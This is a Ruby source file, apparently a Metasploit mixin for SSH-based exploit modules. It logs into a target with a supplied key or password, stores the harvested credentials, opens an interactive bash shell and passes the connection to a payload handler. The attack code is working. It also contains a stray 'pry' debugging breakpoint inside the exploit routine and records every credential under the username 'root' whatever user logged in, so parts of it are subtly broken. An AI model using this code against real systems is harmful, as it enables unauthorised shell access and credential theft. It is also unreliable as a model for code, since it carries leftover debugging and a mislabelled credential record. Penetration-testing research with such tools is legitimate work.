# -*- coding: binary -*-

module Msf
module Exploit::Remote::SSH

  # Ghetto hack to prevent the shell detection logic in
  # {Handler::FindPort#_check_shell} from hitting false negatives due to
  # weirdness with ssh sockets. We already know it's a shell anyway because
  # auth succeeded by this point, so there's really no need to do the check.
  module TrustMeItsAShell
    def _check_shell(*args)
      true
    end
  end

  def initialize(info = {})
    super(update_info(info, {
      'Arch' => ARCH_CMD,
      'Targets' => [
        [
          "Universal", {
            'Payload' => {
              'Compat' => {
                'PayloadType'    => 'cmd_interact',
                'ConnectionType' => 'find',
              },
            },
          }
        ],
        [ "Command payload", {} ],
      ],
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DefaultTarget' => 0,
    }))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptString.new('SHELL', [ true, 'Shell command to run after authentication', '/bin/bash -i' ]),
      ], Msf::Exploit::Remote::SSH
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

    register_autofilter_ports(22)
    register_autofilter_services('ssh')
  end

  # @abstract Override if you have a key
  # @return [String] an ssh private key in PEM format
  def key_data
  end

  # @abstract Override if you have a password
  # @return [String]
  def password
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def setup
    if payload_instance.respond_to?(:_check_shell)
      payload_instance.extend(TrustMeItsAShell)
    end
    super
  end

  def do_login(user = username)
    ssh_options = {
      auth_methods: ['publickey', 'password'],
      config: false,
      disable_agent: true,
      key_data: [ key_data ],
      msfmodule: self,
      msframework: framework,
      password: password,
      port: rport,
      proxies: datastore['Proxies'],
      record_auth_info: true,
    }
    ssh_options.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(rhost, user, ssh_options)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh_socket

      service_data = {
        address: rhost,
        port: rport,
        protocol: 'tcp',
        service_name: 'ssh',
        workspace_id: myworkspace_id,
      }
      credential_data = {
        username: 'root',
        private_type: (ssh_socket.auth_info[:method] == "publickey" ? :ssh_key : :password),
        private_data: (ssh_socket.auth_info[:method] == "publickey" ? key_data : password),
        origin_type: :service,
        module_fullname: fullname,
      }.merge(service_data)

      core = create_credential(credential_data)
      login_data = {
        core: core,
        last_attempted: Time.now,
      }.merge(service_data)

      create_credential_login(login_data)

      conn = Net::SSH::CommandStream.new(ssh_socket, datastore['SHELL'], true)
      return conn
    else
      return false
    end
  end

  def exploit
    conn = do_login
    if conn
      print_good "Successful login"
      require 'pry'
      pry conn
      if payload.encoded.length > 0
        conn.ssh.exec(payload.encoded)
      end
      handler(conn.lsock)
    end
  end

end
end
